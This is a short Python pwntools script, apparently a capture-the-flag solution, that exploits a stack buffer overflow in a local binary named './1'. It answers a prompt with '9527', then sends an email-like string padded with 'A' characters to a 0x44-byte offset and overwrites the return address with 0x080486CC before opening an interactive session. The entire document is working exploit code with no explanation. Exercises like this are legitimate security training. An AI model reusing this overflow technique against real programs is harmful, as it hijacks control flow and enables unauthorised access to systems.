from pwn import *
import re

context.log_level = 'debug'

conn = process('./1')

conn.sendlineafter('> ', '9527')
payload =  'z@z.zzzz'
payload += (0x74 - 0x30 - len(payload)) * 'A'
# distance is 0x74 - 0x30 = 0x44
payload += p32(0x080486CC)

conn.sendlineafter('> ', payload)
conn.interactive()
